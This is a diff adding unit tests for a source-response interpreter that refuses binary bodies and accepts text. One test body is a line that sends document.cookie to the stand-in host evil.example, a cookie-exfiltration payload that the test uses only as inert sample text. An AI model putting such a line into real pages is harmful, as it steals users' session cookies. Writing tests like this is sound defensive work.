@@ -176,6 +176,35 @@ describe("interpretSourceResponse", () => {
     expect(outcome.status).toBe("updated");
   });
 
+  it("refuses a binary body that arrives without a content type", () => {
+    const outcome = interpretSourceResponse(
+      plain,
+      planSourceRequest(plain),
+      respond(200, "\u007fELF\u0002\u0001\u0000\u0000", {})
+    );
+    expect(outcome.status === "error" && outcome.message).toContain("binary");
+  });
+
+  it("refuses a binary body labelled octet-stream", () => {
+    const outcome = interpretSourceResponse(
+      plain,
+      planSourceRequest(plain),
+      respond(200, "PK\u0003\u0004\u0000", { "Content-Type": "application/octet-stream" })
+    );
+    expect(outcome.status).toBe("error");
+  });
+
+  it("takes JavaScript served as Markdown as the text it is", () => {
+    // The body is never run, only diffed and offered as cards, so what it
+    // says is no reason to refuse it; the cards are where code is flagged.
+    const outcome = interpretSourceResponse(
+      plain,
+      planSourceRequest(plain),
+      respond(200, "fetch('https://evil.example/' + document.cookie);\n")
+    );
+    expect(outcome.status).toBe("updated");
+  });
+
   it("refuses a document over the size limit", () => {
     const outcome = interpretSourceResponse(
       plain,
